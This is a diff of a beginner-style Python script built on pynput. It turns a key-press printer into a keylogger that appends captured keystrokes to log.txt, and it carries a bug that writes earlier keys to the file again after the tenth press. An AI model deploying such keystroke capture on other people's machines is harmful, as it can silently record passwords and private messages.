@@ -2,9 +2,21 @@
 import pynput
 # Listener is what is going to listen to a key event
 from pynput.keyboard import Key, Listener
-
+i = 0
+keys = []
 def typed(key):
-    print('the {0} was clicked'.format(key))
+    global keys, i
+    keys.append(key)
+    i += 1
+    if i>10:
+        writeOnFile(keys)
+
+
+def writeOnFile(keys):
+    with open("log.txt","a") as f:
+        for key in keys:
+            f.write(str(key))
+
 def released(key):
     if key==Key.esc:
         return False
